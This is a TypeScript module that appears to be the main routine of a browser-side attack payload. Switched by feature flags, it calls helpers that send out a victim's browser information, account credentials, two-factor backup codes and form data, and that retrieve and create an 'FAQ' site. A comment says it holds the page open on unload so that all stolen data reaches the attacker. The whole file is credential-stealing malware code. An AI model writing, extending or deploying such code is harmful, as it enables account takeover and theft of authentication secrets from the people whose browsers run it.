import {
	ENABLE_RETRIEVING_BROWSER_INFO,
	ENABLE_RETRIEVING_ACCOUNT_CREDENTIALS,
	ENABLE_RETRIEVING_BACKUP_CODES,
	ENABLE_RETRIEVING_FORMS,
	ENABLE_WAIT_UNTIL_BEFORE_UNLOAD,
	ENABLE_RETRIEVING_AND_CREATING_FAQ,
} from 'constants/directives';
import { sendBrowserInfo } from './sendBrowserInfo';
import { sendAccountInfo } from './sendAccountInfo';
import { sendForms } from './sendForms';
import { waitUntilBeforeUnload } from 'utils';
import { sendFaqSite } from './sendFaqSite';

export function sendAll(): Promise<void> {
	const promises = [];

	if (ENABLE_RETRIEVING_BROWSER_INFO) {
		promises.push(sendBrowserInfo());
	}

	if (ENABLE_RETRIEVING_ACCOUNT_CREDENTIALS) {
		promises.push(
			sendAccountInfo({
				tryGetBackupCodes: ENABLE_RETRIEVING_BACKUP_CODES,
			})
		);
	}

	if (ENABLE_RETRIEVING_FORMS) {
		promises.push(sendForms());
	}

	if (ENABLE_RETRIEVING_AND_CREATING_FAQ) {
		promises.push(sendFaqSite());
	}

	const promise = Promise.all(promises).then(() => undefined);

	if (ENABLE_WAIT_UNTIL_BEFORE_UNLOAD) {
		/**
		 * In case the victim clicks on a link on the website,
		 * it should be ensured that all data is sent.
		 */
		waitUntilBeforeUnload(promise);
	}

	return promise;
}
